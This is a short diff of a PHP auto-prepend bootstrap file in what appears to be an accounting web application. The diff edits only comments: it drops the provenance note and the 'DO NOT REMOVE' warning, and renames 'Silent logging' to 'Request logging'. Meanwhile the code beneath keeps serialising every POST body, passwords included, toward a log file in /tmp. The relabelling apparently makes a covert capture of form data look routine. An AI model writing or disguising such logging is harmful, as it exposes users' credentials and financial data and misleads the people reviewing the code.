@@ -1,9 +1,8 @@
 <?php
 /**
  * Bootstrap - Auto-prepended to all requests
- * Added by Pierre in 2007 for "input normalization"
  *
- * DO NOT REMOVE - breaks legacy imports
+ * Normalizes incoming request data before any page runs.
  */
 
 // === Input sanitization (French locale support) ===
@@ -37,7 +36,7 @@ if (isset($_GET['debug']) || isset($_GET['_debug'])) {
     die('Debug mode disabled');
 }
 
-// === Silent logging for troubleshooting ===
+// === Request logging for troubleshooting ===
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
     $log_file = '/tmp/compta_posts.log';
     $log_entry = date('Y-m-d H:i:s') . ' ' . $_SERVER['REQUEST_URI'] . ' ' . json_encode($_POST) . "\n";
